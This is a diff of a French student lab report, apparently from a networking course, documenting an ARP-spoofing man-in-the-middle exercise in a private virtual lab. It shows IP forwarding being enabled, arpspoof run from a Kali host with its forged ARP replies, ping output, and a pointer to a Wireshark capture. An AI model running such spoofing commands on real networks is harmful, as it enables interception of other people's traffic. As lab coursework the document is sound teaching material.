@@ -698,39 +698,67 @@ Ajout du Forwading pour que Kali laisse passer les paquets qu'elle intercepte, a
 sudo sysctl -w net.ipv4.ip_forward=1
 ```
 
-- PING
-  ```sh
-  node 1:
-  node1> ping 10.1.1.211
+🌞 Proof 
 
-   84 bytes from 10.1.1.211 icmp_seq=1 ttl=63 time=8.464 ms
-  84 bytes from 10.1.1.211 icmp_seq=2 ttl=63 time=6.867 ms
-  84 bytes from 10.1.1.211 icmp_seq=3 ttl=63 time=7.001 ms
-  84 bytes from 10.1.1.211 icmp_seq=4 ttl=63 time=7.056 ms
-  84 bytes from 10.1.1.211 icmp_seq=5 ttl=63 time=8.063 ms
+- Attaque mené:
+- Depuis node1
+  ```sh
+  ┌──(kali㉿kali)-[~]
+  └─$ sudo arpspoof -i eth2 -t 10.1.1.211 10.1.1.233
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+  8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
   ```
 
-```sh
-node 2: 
-node2> ping 10.1.1.210
-
-84 bytes from 10.1.1.210 icmp_seq=1 ttl=63 time=6.193 ms
-84 bytes from 10.1.1.210 icmp_seq=2 ttl=63 time=6.472 ms
-84 bytes from 10.1.1.210 icmp_seq=3 ttl=63 time=2.769 ms
-84 bytes from 10.1.1.210 icmp_seq=4 ttl=63 time=6.432 ms
-84 bytes from 10.1.1.210 icmp_seq=5 ttl=63 time=4.088 ms
+-Depuis node2
+ ```sh
+┌──(kali㉿kali)-[~]
+└─$ sudo arpspoof -i eth2 -t 10.1.1.211 10.1.1.233
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
+8:0:27:89:b2:d7 0:50:79:66:68:1 0806 42: arp reply 10.1.1.233 is-at 8:0:27:89:b2:d7
 ```
- les pings ont fontionnés. 
 
- 
-  
+- ping
 
+node1:
+```sh
+node1> ping 10.1.1.211
 
+84 bytes from 10.1.1.211 icmp_seq=1 ttl=64 time=4.034 ms
+84 bytes from 10.1.1.211 icmp_seq=2 ttl=64 time=3.388 ms
+84 bytes from 10.1.1.211 icmp_seq=3 ttl=64 time=3.350 ms
+84 bytes from 10.1.1.211 icmp_seq=4 ttl=64 time=3.524 ms
+84 bytes from 10.1.1.211 icmp_seq=5 ttl=64 time=3.355 ms
+```
 
+node2:
+```sh
+node2> ping 10.1.1.233
 
-🌞 Proof !
+84 bytes from 10.1.1.233 icmp_seq=1 ttl=64 time=3.149 ms
+84 bytes from 10.1.1.233 icmp_seq=2 ttl=64 time=3.218 ms
+84 bytes from 10.1.1.233 icmp_seq=3 ttl=64 time=2.730 ms
+84 bytes from 10.1.1.233 icmp_seq=4 ttl=64 time=4.010 ms
+84 bytes from 10.1.1.233 icmp_seq=5 ttl=64 time=3.037 ms
+```
 
-``
+➜ Wireshark this
+
+Dispo dans p4_mitm.pcap
+
 
 
 
